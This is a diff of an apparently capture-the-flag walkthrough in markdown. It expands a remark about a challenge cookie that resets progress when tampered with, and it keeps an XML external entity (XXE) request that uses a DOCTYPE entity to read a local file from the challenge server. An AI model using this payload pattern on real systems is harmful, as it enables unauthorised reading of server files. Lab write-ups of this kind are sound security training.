@@ -46,41 +46,25 @@ Drag the sailboat to the cake:
 ![The Fountain](/img/fountain/fountain14.png)
 
 
-SIMPLE FORMAT
-TYPE
 
-
-Tampering with the `MiniLembanh` cookie
+Tampering with the `MiniLembanh` cookie unfortunately does nothing more than force you to start over. This took a while to realize that this wasn't the way forward but rather a way that the challenge punishes you for messing with the wrong data. But live and learn I suppose.
 
 ![The Fountain](/img/fountain/fountain15.png)
 
-Stuck here:
 ```
 Content-Type: application/xml
 
-
 <?xml version="1.0" encoding="ISO-8859-1"?>
-
 <!DOCTYPE foo [
-
 	<!ELEMENT visit ANY >
-
 <!ENTITY xxe SYSTEM "file:///static/js/ringlist.js">]>
-
 <root>
-
 <imgDrop>&xxe;</imgDrop>
-
 <who>princess</who>
-
 <reqType>xml</reqType>
-
 <visit>
-
 &xxe;
-
 </visit>
-
 </root>
 ```
 
